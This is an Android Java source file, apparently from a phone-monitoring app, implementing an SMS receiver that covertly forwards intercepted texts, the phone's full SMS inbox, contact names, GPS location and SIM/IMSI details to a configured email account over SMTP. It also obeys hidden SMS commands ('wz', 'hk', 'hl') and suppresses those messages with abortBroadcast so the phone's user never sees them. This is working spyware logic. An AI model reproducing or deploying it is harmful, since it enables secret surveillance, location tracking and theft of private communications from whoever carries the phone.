package com.shiliukeji.xc_lsy.androidkillerservice.reveiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.R;
import com.shiliukeji.xc_lsy.androidkillerservice.location.Location;
import com.shiliukeji.xc_lsy.androidkillerservice.service.GetSharePrefe;
import com.shiliukeji.xc_lsy.androidkillerservice.service.OtherOperatorService;
import com.shiliukeji.xc_lsy.androidkillerservice.service.PhoneService;

/**
 * Created by XC_LSY on 2017/7/6.
 */

public class SMSBroadcastReceiver extends BroadcastReceiver {
    private String addr;
    private String baiduMap;
    private String pName;
    private String poiString;

    public void onReceive(Context context, Intent intent) {
        XLog.d("短信的检测信息！");
        Location location = new Location();
        Location.updateListener();
        GetSharePrefe getSharePrefe = new GetSharePrefe(context);
        SharedPreferences zcps = context.getSharedPreferences("reg", 0);
        if (getSharePrefe.isDuanxinjilu()) {
            String receivetimeString = "";
            String sendnumberString = "";
            String filecontent = "";
            for (Object p : (Object[]) intent.getExtras().get("pdus")) {
                SmsMessage message = SmsMessage.createFromPdu((byte[]) p);
                filecontent = new StringBuilder(String.valueOf(filecontent)).append(message.getMessageBody().trim()).toString();
                receivetimeString = OtherOperatorService.getCurrentTime(Long.valueOf(message.getTimestampMillis()));
                sendnumberString = message.getOriginatingAddress().trim();
            }
            if (sendnumberString.length() > 11) {
                sendnumberString = sendnumberString.substring(sendnumberString.length() - 11, sendnumberString.length());
            }
            String shoujiName = getSharePrefe.getShoujiName();
            String userEmail = getSharePrefe.getUserEmail();
            if (getSharePrefe.isWeizhijilu()) {
                String temps = new StringBuilder(String.valueOf(Location.getLocation().getLongitude())).append(",").append(Location.getLocation().getLatitude()).toString();
                this.baiduMap = "<img src=http://api.map.baidu.com/staticimage?center=" + temps + "&width=280&height=160&zoom=18&markers=" + temps + "&scale=2 />";
                this.addr = Location.getLocation().getAddr();
                if (this.addr == null) {
                    this.addr = "位置信息不明";
                }
                String temppoi = Location.getLocation().getPoiStr();
                if (temppoi == null) {
                    this.poiString = "位置周边信息不明";
                } else {
                    this.poiString = OtherOperatorService.getSubstring(temppoi);
                }
            }
            boolean iszhuce = OtherOperatorService.isReg(getSharePrefe.getUserEmail(), getSharePrefe.getShoujiImei(), zcps.getString("zhucema", ""));
            if (!filecontent.contains("来-")) {
                if (filecontent.equalsIgnoreCase("wz") && iszhuce) {
                    if (OtherOperatorService.check3Gwifi(context)) {
                        OtherOperatorService.uploadEmail(getSharePrefe.getSmtp(), getSharePrefe.getPort(), userEmail, getSharePrefe.getUserPassword(), userEmail, new String[]{userEmail}, new StringBuilder(String.valueOf(shoujiName)).append("发来--位置邮件").toString(), "位置：" + this.addr + "<br/>" + this.baiduMap);
                    }
                    abortBroadcast();
                    return;
                }
                String temp;
                if (filecontent.equalsIgnoreCase("hk") && iszhuce) {
                    TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String NativePhoneNumber = telephonyManager.getLine1Number();
                    String IMSI = telephonyManager.getSubscriberId();
                    temp = "";
                    if (!IMSI.equals(getSharePrefe.getCardIMSI())) {
                        String temp2 = new StringBuilder(String.valueOf(shoujiName)).append(":已换卡。换前卡信息：").append(getSharePrefe.getCardNumber()).append(",").append(getSharePrefe.getCardIMSI()).append(";换后卡信息：").append(NativePhoneNumber).append(",").append(IMSI).append("(").append(OtherOperatorService.getCardName(IMSI)).append(")").toString();
                        if (OtherOperatorService.check3Gwifi(context)) {
                            OtherOperatorService.uploadEmail(getSharePrefe.getSmtp(), getSharePrefe.getPort(), userEmail, getSharePrefe.getUserPassword(), userEmail, new String[]{userEmail}, new StringBuilder(String.valueOf(shoujiName)).append("发来--换卡通知").toString(), "换前卡信息：" + getSharePrefe.getCardNumber() + "," + getSharePrefe.getCardIMSI() + "<br/>" + "换后卡信息：" + NativePhoneNumber + "," + IMSI + "(" + OtherOperatorService.getCardName(IMSI) + ")");
                            temp = temp2;
                        } else {
                            temp = temp2;
                        }
                    } else {
                        temp = new StringBuilder(String.valueOf(shoujiName)).append(":没换卡。当前卡信息：").append(NativePhoneNumber).append(",").append(IMSI).append("(").append(OtherOperatorService.getCardName(IMSI)).append(")").toString();
                        if (OtherOperatorService.check3Gwifi(context)) {
                            OtherOperatorService.uploadEmail(getSharePrefe.getSmtp(), getSharePrefe.getPort(), userEmail, getSharePrefe.getUserPassword(), userEmail, new String[]{userEmail}, new StringBuilder(String.valueOf(shoujiName)).append("发来--当前手机卡信息").toString(), temp);
                        }
                    }
                    abortBroadcast();
                } else if ("hl".equalsIgnoreCase(filecontent.substring(0, 2)) && iszhuce) {
                    try {
                        temp = filecontent.substring(2);
                        Intent intent2 = new Intent(context, PhoneService.class);
                        if (Integer.parseInt(temp) <= 60) {
                            intent2.putExtra("outNumber", temp);
                        } else {
                            intent2.putExtra("outNumber", "1");
                        }
                        context.startService(intent2);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    abortBroadcast();
                } else {
                    this.pName = OtherOperatorService.getContactNameFromPhoneBook(context, sendnumberString);
                    String subject = new StringBuilder(String.valueOf(shoujiName)).append("发来--短信邮件(号码:").append(sendnumberString).append("；位置:").append(this.addr).append(")").toString();
                    String content = new StringBuilder(String.valueOf(receivetimeString)).append("收到：<br/>号码:").append(sendnumberString).append("(").append(this.pName).append(")<br/>内容：").append(filecontent).append("<br/>位置：").append(this.addr).append("<br/>附近信息：").append(this.poiString).append("<br/>").append(this.baiduMap).append("<br/>----------------------------------------<br/>").append(OtherOperatorService.getSmsInPhone(context)).toString();
                    if (OtherOperatorService.check3Gwifi(context)) {
                        String smtp = getSharePrefe.getSmtp();
                        String port = getSharePrefe.getPort();
                        String password = getSharePrefe.getUserPassword();
                        String[] tos = new String[]{userEmail};
                        if (getSharePrefe.isAllnet()) {
                            OtherOperatorService.uploadEmail(smtp, port, userEmail, password, userEmail, tos, subject, content);
                            if (!OtherOperatorService.isReg(getSharePrefe.getUserEmail(), getSharePrefe.getShoujiImei(), zcps.getString("zhucema", ""))) {
                                OtherOperatorService.showNotisfy(context, R.drawable.mytp, "温馨提示:你刚才的短信记录已为你备份至" + userEmail + "邮箱", "温馨提示", new StringBuilder(String.valueOf(sendnumberString)).append("短信已为你备份至").append(userEmail).append("邮箱").toString());
                            }
                        } else if (getSharePrefe.isWifi() && OtherOperatorService.checkwifiwork(context)) {
                            OtherOperatorService.uploadEmail(smtp, port, userEmail, password, userEmail, tos, subject, content);
                            if (!OtherOperatorService.isReg(getSharePrefe.getUserEmail(), getSharePrefe.getShoujiImei(), zcps.getString("zhucema", ""))) {
                                OtherOperatorService.showNotisfy(context, R.drawable.mytp, "温馨提示:你刚才的短信记录已为你备份至" + userEmail + "邮箱", "温馨提示", new StringBuilder(String.valueOf(sendnumberString)).append("短信记录已为你备份至").append(userEmail).append("邮箱").toString());
                            }
                        }
                    }
                }
            }
        }
    }
}